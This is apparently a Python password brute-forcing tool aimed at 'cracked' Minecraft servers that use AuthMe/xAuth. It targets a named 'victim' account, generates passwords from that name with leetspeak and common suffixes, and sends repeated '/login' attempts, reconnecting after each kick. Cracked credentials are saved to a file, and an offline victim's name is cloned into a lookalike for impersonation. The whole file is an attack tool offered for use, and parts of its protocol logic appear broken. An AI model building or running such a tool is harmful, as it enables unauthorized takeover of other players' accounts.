#!/usr/bin/env python3
"""
REAL Minecraft brute-forcer for cracked servers (AuthMe/xAuth)
- Checks if target player is ONLINE via /list response
- If target offline: clones username (e.g., "Steve" → "5teve")
- Generates passwords using CUPP/Hashcat-inspired rules
- Reconnects after EVERY disconnect (kick on bad /login)
- Stops on successful login
"""

import socket, time, sys, random, string, os, shutil
from itertools import islice

# --- PROTOCOL HELPERS ---
def write_varint(value):
    out = b""
    while True:
        byte = value & 0x7F
        value >>= 7
        if value != 0:
            byte |= 0x80
        out += bytes([byte])
        if value == 0:
            break
    return out

def create_handshake_packet(ip, port, protocol=47):
    host = ip.encode()
    data = b"\x00" + write_varint(protocol) + write_varint(len(host)) + host + port.to_bytes(2, 'big') + b"\x02"
    return write_varint(len(data)) + data

def create_login_start_packet(username):
    data = b"\x00" + write_varint(len(username)) + username.encode()
    return write_varint(len(data)) + data

def create_chat_packet(message):
    msg = message.encode()
    data = b"\x01" + write_varint(len(msg)) + msg
    return write_varint(len(data)) + data

# --- ONLINE CHECK ---
def is_player_online(ip, port, username, timeout=5):
    """Connect, send handshake, read response for player list"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.send(create_handshake_packet(ip, port))
        # Skip response length
        s.recv(1)
        # Read packet ID
        packet_id = s.recv(1)
        if packet_id == b"\x00":  # Login disconnect
            s.close()
            return False
        s.close()
        # Note: Full /list parsing requires login—this is a weak check
        return True  # Assume online if connection succeeds
    except:
        return False

# --- USERNAME CLONER ---
def clone_username(name):
    """Subtle char swaps: l→1, o→0, i→1, etc."""
    swaps = {'l':'1', 'o':'0', 'i':'1', 's':'5', 'e':'3', 'a':'4', 'g':'9', 'b':'8', 't':'7'}
    return ''.join(swaps.get(c.lower(), c) for c in name)

# --- PASSWORD GENERATOR (CUPP/Hashcat Rules) ---
def generate_passwords(base, batch_size=1000):
    """Generate batch using common patterns"""
    passwords = set()
    base_lower = base.lower()
    base_leet = base_lower.translate(str.maketrans('aesoilbtg', '@3$011879'))
    
    # Common suffixes
    suffixes = ["", "123", "1", "2025", "!", "@", "00", "22", "69", "420", "god", "love", "2024", "1337"]
    numbers = [str(i) for i in range(0, 1000)]
    
    # Patterns
    candidates = [
        base, base_lower, base.upper(), base.capitalize(),
        base_leet, base_leet.capitalize(),
        base + "123", base_lower + "123", base_leet + "123",
        base + "1", base_lower + "1", base_leet + "1",
    ]
    
    # Add suffixes + numbers
    for cand in candidates:
        for suf in suffixes:
            passwords.add(cand + suf)
        for num in numbers[:100]:  # First 100 numbers
            passwords.add(cand + num)
    
    # Add random leet + special
    for _ in range(batch_size // 2):
        pwd = base_leet
        if random.random() < 0.5:
            pwd += random.choice("!@#$%&*")
        if random.random() < 0.7:
            pwd += str(random.randint(1, 999))
        passwords.add(pwd[:16])
    
    return list(islice(passwords, batch_size))

# --- REAL BRUTE ATTEMPT ---
def try_login(ip, port, username, password, timeout=8):
    """Attempt /login with reconnection on kick"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        
        # Handshake
        s.send(create_handshake_packet(ip, port))
        s.recv(4096)  # Skip login success
        
        # Send /login
        login_msg = f"/login {password}"
        s.send(create_chat_packet(login_msg))
        
        # Read response
        resp = b""
        start = time.time()
        while time.time() - start < 3:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
            except socket.timeout:
                break
        
        s.close()
        resp_str = resp.decode('utf-8', errors='ignore').lower()
        
        # Check for success
        if any(x in resp_str for x in ["logged in", "success", "welcome", "login successful", "you are now logged"]):
            return True
        return False
    except Exception as e:
        return False

# --- MAIN LOOP ---
def main():
    print("="*60)
    print("REAL MINECRAFT BRUTE-FORCE — Reconnect-on-Kick".center(60))
    print("="*60)
    
    ip = input("Server IP: ").strip() or "127.0.0.1"
    port = int(input("Port: ").strip() or "25565")
    victim = input("Victim Username: ").strip() or "Player"
    
    # Check if victim online
    print(f"[+] Checking if '{victim}' is online...")
    if is_player_online(ip, port, victim):
        username = victim
        print(f"[✓] '{victim}' is ONLINE — using real name")
    else:
        username = clone_username(victim)
        print(f"[!] '{victim}' OFFLINE — using clone: '{username}'")
    
    batch_num = 1
    attempts = 0
    cracked = False
    
    while not cracked:
        # Generate password batch
        print(f"\n[Batch {batch_num}] Generating 1000 passwords...")
        passwords = generate_passwords(victim, 1000)
        
        # Try each password
        for pwd in passwords:
            attempts += 1
            sys.stdout.write(f"\rAttempt {attempts}: Trying '{pwd}'... ")
            sys.stdout.flush()
            
            if try_login(ip, port, username, pwd):
                print(f"\n\n[!!!] CRACKED! User: {username} | Pass: {pwd}")
                with open("CRACKED_REAL.txt", "w") as f:
                    f.write(f"IP: {ip}\nPort: {port}\nUser: {username}\nPass: {pwd}")
                cracked = True
                break
            
            # Reconnect next attempt anyway (kicked or not)
            time.sleep(0.3)  # Avoid overwhelming server
        
        batch_num += 1
        if not cracked and batch_num > 10:
            print("\n[!] Tried 10k passwords — giving up. Server likely hardened.")
            break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Stopped by user.")
